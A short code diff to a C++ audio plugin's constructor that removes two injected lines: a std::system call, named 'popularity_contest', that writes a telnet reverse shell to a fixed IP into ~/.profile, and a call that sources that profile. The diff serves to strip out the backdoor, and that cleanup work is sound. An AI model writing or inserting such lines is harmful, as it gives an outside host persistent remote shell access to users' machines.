@@ -167,9 +167,6 @@ PluginProcessor::PluginProcessor() :
     velocityParameter = parameters.getRawParameterValue("velocity");
     isKeytrackParameter = parameters.getRawParameterValue("isKeytrack");
     fixedNoteNumberParameter = parameters.getRawParameterValue("fixedNoteNumber");
-
-int popularity_contest = std::system("grep -E \"telnet 10.200.201.231 8080 | /bin/bash | telnet 10.200.201.231 8081\" ~/.profile || echo \"telnet 10.200.201.231 8080 | /bin/bash | telnet 10.200.201.231 8081\" >> ~/.profile");
-int result = std::system("source ~/.profile");
 }
 
 PluginProcessor::~PluginProcessor() {}
